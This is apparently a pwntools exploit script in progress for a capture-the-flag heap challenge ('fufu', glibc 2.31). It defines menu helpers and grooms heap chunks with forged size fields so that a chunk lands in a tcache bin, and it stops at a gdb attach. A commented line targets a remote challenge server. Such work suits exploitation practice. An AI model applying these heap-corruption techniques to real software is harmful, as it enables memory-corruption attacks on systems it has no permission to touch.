from pwn import *

ld = ELF("./ld-2.31.so")
elf = ELF("./fufu")
libc = ELF("./libc-2.31.so")

target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
#target = remote("143.198.184.186", 5005)

if True:
    counter = 0
    def sla(s, d):
        target.sendlineafter(s, str(d))

    def create(size, data="whoamiT"):
        global counter
        c = chr(0x41+counter)
        counter = counter + 1
        sla("?", 1)
        sla("?", 0)
        sla("?", size)
        if data == "whoamiT":
            data = c*0x20
        sla("content.", data)

    def display():
        sla("?", 2)
        sla("?", 0)
        target.recvuntil("shows:\n")
        return target.recvline().strip("\n")

    def reset():
        sla("?", 3)
        sla("?", 0)

    def dbg(free=1):
        if free:
            sla("?", "1\n0")
        gdb.attach(target, 'heap chunks\nheap bins')

#Chunk(addr=0x555557408010, size=0x290, flags=PREV_INUSE)
#Chunk(addr=0x5555574082a0, size=0x3f0, flags=PREV_INUSE)
#Chunk(addr=0x555557408690, size=0x100, flags=PREV_INUSE)
#Chunk(addr=0x555557408790, size= 0xe0, flags=PREV_INUSE)
#Chunk(addr=0x555557408870, size=0x100, flags=PREV_INUSE)
create(0x3e0)
create(0xf8)
create(0xd8)
create(0x118)
create(0x118, p64(0x101)*(0x110/8) + p64(0x100))        #--> add 2nd chunk to 0x100 tcache bin

create(0x150, "a"*0x30)



dbg(0)

target.interactive()